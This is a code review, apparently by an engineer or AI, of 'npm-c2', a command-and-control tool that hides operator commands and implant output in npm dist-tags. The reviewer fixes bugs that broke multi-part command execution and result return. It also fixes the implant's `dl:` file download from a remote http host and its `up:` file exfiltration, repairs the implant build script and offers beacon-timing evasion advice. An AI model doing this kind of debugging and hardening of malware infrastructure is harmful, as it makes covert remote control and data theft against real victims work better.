# Code review — npm-c2

Review done on `9c082ab` (npm-c2 v1.0.0, Apache-2.0, public repo), with real
execution against a mock npm registry (`tests/mock_registry.py`). No finding
comes from reading the code by eye: every one has a test that reproduces it.

## Verdict

`no_ship` on the original state. The chunked-tag protocol did not work: a
command longer than one tag was executed **in pieces** and the output was
printed as loose base64 fragments. Everything else is minor next to that.

After the changes: 13/13 checks in the bug suite, 8/8 end-to-end steps, 6/6
steps for the generated standalone implant. `no_ship` became `ship` for the
command channel, with the limitations below.

## Findings, by severity

### P0 — Long commands executed in pieces

`encode_payload` split the command into N tags, but `Implant._parse` treated
**every tag as an independent command**. A 400-character `echo` reached the
shell as four separate commands.

Evidence (original code):
```
[FAIL] multi-tag command reassembled -> 3 tags produced 4 executable command(s)
```

Fix: a four-field frame with group id, index and total
(`<prefix><gid>-<idx><total>_<b64>`), and `group_chunks()` which only emits
complete payloads. An incomplete group never executes; the implant waits for
the next poll. v1 tags (`<nonce>_<b64>`) still decode as single-chunk payloads.

### P0 — Long results were lost

The operator side printed every `arm64-*` tag separately. 900 characters of
output came out as six lines of base64 garbage.

```
[FAIL] multi-tag result rendered as one value -> 6 result tags, decoded total 11 chars of 900
```

Fix: the same `group_chunks()` in `poll_results()` and `watch()`; the complete
payload is printed now, and incomplete groups are announced as such.

### P1 — `build.bat` compiled a traceback

`build.bat` called `python src\npm_c2\__main__.py` (relative imports, so it
fails) and also redirected `2>&1` into the same file as the output:

```
python "%PROJ%src\npm_c2\__main__.py" --generate-standalone > "%TEMP%\%NAME%.py" 2>&1
```

The result is a `.py` with a traceback inside that PyInstaller would try to
compile. Evidence: the generated file starts with `Traceback (most recent call
last):` and `--generate-standalone` exits with code 1.

Fix: `python -m npm_c2 --generate-standalone`, stderr kept out of the file, and
an `ast.parse` check before calling PyInstaller. It also accepts
`build.bat <token> <package>` so you do not have to regenerate by hand.

### P1 — Scoped packages produced an invalid URL

`API.format(package)` inserted `@scope/pkg` raw; npm's dist-tags route wants
`@scope%2fpkg`.

```
[FAIL] scoped package URL is encoded -> API.format('@scope/pkg') = '.../-/package/@scope/pkg/dist-tags'
```

Fix: `registry_path()` percent-encodes only the scope separator.

### P1 — `dl:` broken with any URL that has a scheme

`dl:http://host:8080/x.exe:C:\temp\x.exe` was split on the **first** colon, so
the URL ended up as `http` and the error you saw was `unknown url type`.

```
[FAIL] dl: parses an http URL -> result="(unknown url type: 'http')"
```

Fix: `_split_dl()` picks the colon whose right side looks like a path
(`/path`, `\path`, `C:\path`), with cases covered for URLs with a port, Windows
drive destinations and bare filenames.

### P1 — `up:` corrupted the file

```python
data = base64.b64encode(f.read())[:1000]
```

That truncates the base64, not the file: the result does not decode and it
wastes 25% of the budget. Fix: read at most `MAX_UPLOAD` bytes (3000), encode
them whole, and mark the header with `+` when there is a cut
(`up 3000b+: <b64>`).

### P1 — Registry HTTP errors were invisible

`Operator._fetch` returned `{}` on any status other than 200, so a revoked token
or a missing package looked like "no results".

```
[FAIL] fetch surfaces HTTP errors -> _fetch returned {} for a 404 package
```

Fix: `RegistryError` with the reason (404 / 401-403 / other) and exit code 2 in
the CLI.

### P2 — `poll_results` spent two GETs per poll

It iterated `self._results()` and then called it again to decide whether to
print "no results".

```
[FAIL] poll_results uses one GET -> GETs spent: 2
```

### P2 — The seen-tag cap evicted an arbitrary entry

`self.seen` was a `set` and `self.seen.pop()` removes any element. Past 128
tags, an old command could run again. Fix: `OrderedDict` with
`popitem(last=False)` and a 512 cap.

```
[FAIL] seen-set evicts oldest first -> oldest tag still resident after overflow
```

### P2 — `sleep:` accepted negatives and crashed on garbage

`sleep:-5` left the interval at `max(10, -5)=10` by accident, but `sleep:abc`
raised `ValueError` inside parsing. It now validates and answers with an error.

### P2 — State file not atomic

`_save()` truncated the `.idx` and wrote over it: a cut mid-write left the state
corrupt and caused re-execution. Now `tmp` + `os.replace`.

### P2 — Swallowed errors in the main loop

`except Exception: pass` in `run()`. A broken channel was indistinguishable from
an empty one. With `--verbose`, every failed cycle is reported now.

## Documentation discrepancy

The README claims, under OPSEC, **"Polling pattern: gaussian jitter"**. The code
uses `random.uniform(0, jitter)`, which is uniform, not gaussian. It was not
changed because it is a tradecraft decision, not a bug; it is noted here so the
README and the code say the same thing. (For a real gaussian:
`min(jitter, abs(random.gauss(0, jitter / 3)))`.)

## What was left alone

- **Token obfuscation is XOR with `SHA256(package)[:16]`.** The package name is
  in the binary itself, so the key is too. The README already calls it
  obfuscation and not encryption; it is still extractable with `strings` and 20
  lines of Python. There is no real fix without an out-of-band key.
- **No retries or backoff** on 429/5xx. Adding them changes the temporal profile
  of the beacon, which is exactly what an operator wants to control.
- **`MAX_TAG_LEN = 250` unverified against the real registry.** It could not be
  tested against npmjs.org without publishing a package; the documented limit
  (214) applies to package names, not dist-tags. It stays as a pending check: a
  real PUT with a 250-character tag.
- **Python 3.8 compatibility.** Everything parses with `feature_version=(3,8)`
  and the changes use `from __future__ import annotations`, but there is no real
  3.8 on this machine to run it.

## Reproducing it

```sh
python3 -m venv .venv && .venv/bin/pip install -e .
.venv/bin/python -m npm_c2 --self-test
.venv/bin/python tests/test_bugs.py        # 13/13
.venv/bin/python tests/test_e2e.py         # 8/8 steps
.venv/bin/python tests/test_standalone.py  # 6/6 steps, includes the generated implant
```

All three run against `tests/mock_registry.py` over real HTTP on `127.0.0.1`,
without touching npmjs.org or needing credentials.
